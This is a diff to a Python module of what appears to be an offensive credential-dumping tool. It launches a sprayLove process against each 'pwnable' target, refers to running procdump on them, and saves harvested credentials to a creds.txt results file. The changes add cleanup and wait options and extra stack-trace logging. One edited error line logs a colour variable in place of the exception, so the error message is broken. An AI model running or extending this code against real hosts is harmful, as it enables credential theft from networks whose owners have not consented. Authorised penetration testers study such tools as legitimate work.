@@ -7,7 +7,7 @@
 
 
 # Imports
-import logging, queue
+import logging, traceback
 from core.User import *
 from core.Resources import *
 from core.Targets import *
@@ -25,18 +25,21 @@ def run(args):
     try:
         targets = listPwnableTargets(args.targets, user)
 
-        logging.warning("%sExec procdump on targets. Be patients..." % (warningGre))
+        logging.warning("%sLet's spray some love... Be patient." % (warningGre))
 
         for target in targets:
-            jobs.append(Process(target=sprayLove, args=(user, target, local_ip)))
+            jobs.append(Process(target=sprayLove, args=(user, target, local_ip, args.remove)))
             jobs[-1].start()
 
-        joinThreads(jobs, 180) # wait 3 minutes max
+        joinThreads(jobs, args.wait)
         logging.info("\n%sCredentials logged into: %s" % (warningGre, os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'results', 'creds.txt')))
 
     except KeyboardInterrupt:
         logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
     except Exception as e:
-        logging.warning("%sErr: %s" % (warningRed, e))
+        logging.warning("%sA problem occurs. Err: %s" % (warningRed, red))
+        logging.debug("%s==== STACKTRACE ====" % (blue))
+        if logging.getLogger().getEffectiveLevel() <= 10: traceback.print_exc(file=sys.stdout)
+        logging.debug("%s==== STACKTRACE ====%s" % (blue, white))
     finally:
         exit_gracefully(jobs, 10)
